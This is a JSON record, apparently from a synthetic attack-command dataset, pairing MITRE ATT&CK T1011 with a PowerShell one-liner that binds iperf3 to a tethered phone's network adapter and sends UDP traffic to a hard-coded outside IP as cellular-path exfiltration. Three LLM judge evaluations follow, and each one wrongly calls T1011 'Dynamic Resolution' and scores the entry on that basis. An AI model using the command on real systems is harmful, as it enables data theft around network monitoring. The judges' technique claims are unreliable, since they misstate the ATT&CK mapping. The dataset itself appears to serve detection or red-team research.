{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "$usb=Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*Remote NDIS based Internet Sharing Device*'}; if($usb){$ip=(Get-NetIPAddress -InterfaceIndex $usb.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 104.87.215.11 -p 61111 -B $ip -u -t 35}",
  "explanation": "Targets a USB\u2011tethered RNDIS interface (smartphone tether) and binds iperf3 to it, exfiltrating over the phone\u2019s cellular uplink (alternate medium) as per T1011.",
  "rationale_steps": [
    "Locate the USB RNDIS network adapter from a tethered phone.",
    "Determine its IPv4 address for binding.",
    "Run iperf3 UDP client on a high port bound to the RNDIS interface.",
    "Leverage the phone\u2019s cellular path to bypass the primary network."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-225e09bc-c0a371f5",
  "source_prompt_hash": "225e09bc",
  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses/braces, correct variable assignments, proper piping, conditional logic, and valid parameter flags for all cmdlets used.",
        "semantic_score": 3,
        "semantic_justification": "While the command correctly identifies USB tethered interfaces and attempts data exfiltration via iperf3, it relates more to T1048 (Exfiltration Over Alternative Protocol) than T1011 (Dynamic Resolution), as it doesn't implement domain generation algorithms or dynamic DNS resolution techniques.",
        "combined_score": 4.0,
        "confidence": 0.9,
        "timestamp": "2025-10-02T05:07:57.056215Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The Powershell command is perfectly well-formed, with balanced delimiters, correct cmdlet usage, valid piping, and proper iperf3 flag syntax.",
        "semantic_score": 2,
        "semantic_justification": "The command semantically misaligns with MITRE ATT&CK T1011 'Dynamic Resolution' because it uses a hardcoded IP address instead of dynamically resolving an endpoint, and the claim of 'Privilege: None' is likely incorrect for the `Get-NetAdapter` and `Get-NetIPAddress` cmdlets.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-02T05:08:14.987217Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell is well-formed with balanced braces/quotes, valid cmdlets/properties, proper separators, and valid iperf3 flags.",
        "semantic_score": 1,
        "semantic_justification": "While it binds traffic to a USB RNDIS interface, it uses a hard-coded IP/port and performs no dynamic endpoint resolution (no DGA/fast-flux/dynamic DNS), thus not implementing the described Dynamic Resolution behavior.",
        "combined_score": 3.0,
        "confidence": 0.84,
        "timestamp": "2025-10-02T05:08:48.756484Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 2.0,
    "llm_average_score": 3.5,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}